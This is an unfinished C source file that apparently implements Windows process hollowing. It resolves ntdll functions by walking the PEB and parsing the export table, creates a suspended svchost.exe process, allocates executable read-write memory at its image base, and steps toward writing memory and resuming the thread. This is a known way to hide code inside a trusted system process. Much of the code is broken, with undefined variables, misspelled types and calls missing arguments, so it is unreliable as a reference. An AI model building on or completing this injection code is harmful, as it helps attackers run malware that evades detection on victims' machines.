#include <stdio.h>
#include "main.h"
#include <windows.h>
#include <winternl.h>
#include <winnt.h>
#include <intrin.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")
#define g(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define e(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define i(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
#define ss 0x00000000
#define THREAD_CREATE_FLAGS_CREATE_SUSPENDED 0x00000001 // NtCreateUserProcess & NtCreateThreadEx
#define PS_ATTRIBUTE_PARENT_PROCESS PsAttributeValue(PsAttributeParentProcess, FALSE, TRUE, TRUE)
size_t GMH() {
    wchar_t ln = L"C:\\WINDOWS\\System32\\ntdll.dll";
    PEB* pPeb = (PEB*)__readgsqword(0x60);
    PLIST_ENTRY header = &(pPeb->Ldr->InMemoryOrderModuleList);


    for (PLIST_ENTRY curr = header->Flink; curr != header; curr = curr->Flink) {
        LDR_DATA_TABLE_ENTRY* data = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);


        if (StrStrIW(ln, data->FullDllName.Buffer)) {

            return data->DllBase;
        }

    }
    return 0;


}


size_t GFA(size_t org, char* fn) {

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)(modb + dosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER opH = ntHdr->OptionalHeader;
    IMAGE_DATA_DIRECTORY data_Dir = opH.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY exportTable = (PIMAGE_EXPORT_DIRECTORY)(modb + data_Dir.VirtualAddress);

    DWORD* arrf = (DWORD *)(modb + exportTable->AddressOfFunctions);
    DWORD* arrn = (DWORD*)(modb + exportTable->AddressOfNames);
    DWORD* arrno = (DWORD*)(modb + exportTable->AddressOfNameOrdinals);

    for (size_t i = 0; i < exportTable->NumberOfNames; i++) {
        char* name = (char*)(modb + arrn[i]);
        WORD numCAPIO = arrno[i] + 1;
        if (!stricmp(name, fn)) {
            return modb + arrf[numCAPIO - 1];

        }

    }


    return 0;


}




int statCheck(NTSTATUS status) {

    if (status == STATUS_SUCCESS ) {
        return 0;

    }
    else {
        return 1;
    }


}

int main(void) {

    STARTUPINFO si;
    NTSTATUS status;
    HANDLE hThread;
    HANDLE nThread;


    HANDLE hProcess;
    HANDLE nProcess;

    // resolve functions
    size_t kb = GMH();

    size_t ptr_NtCreateProcess = (size_t)GFA(kb, L"NtCreateProcess");
    size_t ptr_NtAllocateVirtualMemory = (size_t)GFA(kb, L"NtAllocateVirtualMemory");
    size_t ptr_NtGetContextThread = (size_t)GFA(kb, L"NtGetContextThread");
    size_t ptr_NtWriteVirtualMemory = (size_t)GFA(kb, L"NtWriteVirtualMemory");
    size_t ptr_NtResumeThread = (size_t)GFA(kb, L"NtResumeThread");
    size_t ptr_NtCreateFile = (size_t)GFA(kb, L"NtCreateFile");
    size_t ptr_NtOpenProcess = (size_t)GFA(kb, L"NtOpenProcess");
    size_t ptr_NtCreateUserProcess = (size_t)GFA(kb, L"NtCreateUserProcess");
    size_t ptr_RtlCreateProcessParametersEx=(size_t)GFA(kb, L"RtlCreateProcessParametersEx");
    size_t ptr_RtlInitUnicodeString = (size_t)GFA(kb, L"RtlInitUnicodeString");

    DWORD pid;


    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "svchost.exe") == 0)
            {
              pid = entry.th32ProcessID;

                CloseHandle(hProcess);
            }
        }
    }

    CloseHandle(snapshot);


    PS_CREATE_INFO CreateInfo;
    CreateInfo.Size = sizeof(CreateInfo);
    CreateInfo.State = PsCreateInitialState;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    OBJECT_ATTRIBUTES toa;
    InitializeObjectAttributes(&toa, NULL, 0, NULL, NULL);

    PPS_ATTRIBUTE_LIST attributes = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
    attributes->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);

    attributes->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attributes->Attributes[0].Size = NtImagePath.Length;
    attributes->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;


    //(&Impath, (PWSTR)L"C:\\Windows\\System32\\svchost.exe"
    UNICODE_STRING Impath;
    RtlInitUnicodeString(&Impath, (PWSTR)L"\C:\\Windows\\System32\\svchost");

    status = ((NTSTATUS(NTAPI*)(PRTL_USER_PROCESS_PARAMETER,  PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PVOID, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, PUNICODE_STRING, ULONG))ptr_RtlCreateProcessParametersEx)(&ProcessParameters, &Impath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);


    //status = ((NTSTATUS(NTAPI*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID))ptr_NtOpenProcess)(hProcess,PROCESS_ALL_ACCESS, NULL, pid);
    status = ((NTSTATUS(NTAPI*)(PHANDLE, PHANDLE, ACCESS_MASK, ACCESS_MASK, PCOBJECT_ATTRIBUTES, PCOBJECT_ATTRIBUTES, ULONG, ULONG, PRTL_USER_PROCESS_PARAMETERS, PPS_CREATE_INFO, PPS_ATTRIBUTE_LIST))ptr_NtCreateUserProcess)(&nProcess, &nThread,  NULL, NULL, &oa, &toa, NULL,THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, attributes);


    if (statCheck(status)){
        g("process created at %p ", nProcess);


        PEB* pPeb = (PEB*)__readgsqword(0x60);
        PLIST_ENTRY header = &(pPeb->Ldr->InLoadOrderModules);
        DWORD BaseOffset = (DWORD)pPeb->PebBaseAddress + 8;



        HANDLE sf = CreateFileA("C:\\WINDOWS\\System32\\svchost.exe", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
        DWORD sfz = GetFileSize(sf, NULL);
        LPDWORD fbr;
        LPVOID modb = HeapAlloc(GetProcessHeap(), HEAP_ZERO_Memory, sfz);
        ReadFile(sf, modb,sfz, fbr, NULL);


        PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)(modb);
        PIMAGEptr_NT_HEADERS ntHdr = (PIMAGEptr_NT_HEADERS)(modb + dosHdr->e_lfanew);
        IMAGE_OPTIONAL_HEADER base = ntHdr->OptionalHeader.ImageBase;
        IMAGE_OPTIONAL_HEADER size = ntHdr->OptionalHeader.SizeOfImage;


        LPVOID baseAddress = NULL;



        if (statCheck(status)) {
            g("context allocated at %p",   &baseAddress);
        }

        LPCONTEXT CTX;
        // here, go from here later
        status = ((NTSTATUS(NTAPI*)())ptr_NtAllocateVirtualMemory)(NULL, &baseAddress, sizeof(CTX),MEM_COMMIT, PAGE_READWRITE);
        CTX = LPCONTEXT(&baseAddress);
        CTX ->ContextFlags = CONTEXT_FULL;



        PCONTEXT pContext;

        status = ptr_NtGetContextThread();
        if (statCheck(status)) {

            g("context thread gotten at %p",  &baseAddress);


            LPVOID t;
            status = ((UINT (NTAPI*)(HANDLE, BaseAddress, ULONG_PTR, PSZIE_T, ULONH, ULONG))ptr_NtAllocateVirtualMemory)(hProcess, base , size, 0x3000, PAGE_EXECUTE_READWRITE);


        }


       // status = NtUnmmapViewOfSection();



        status = ptr_NtGetContextThread();


        if (status == STATUS_SUCCESS) {


        }



        status = ptr_NtWriteVirtualMemory();



        status = ptr_NtResumeThread();



    }
    else {
        e("unable to create proc from %p", hProcess);
    }
    RtlFreeHeap(RtlProcessHeap(), 0, attributes);
    RtlDestroyProcessParameters(ProcessParameters);


    return 0;
}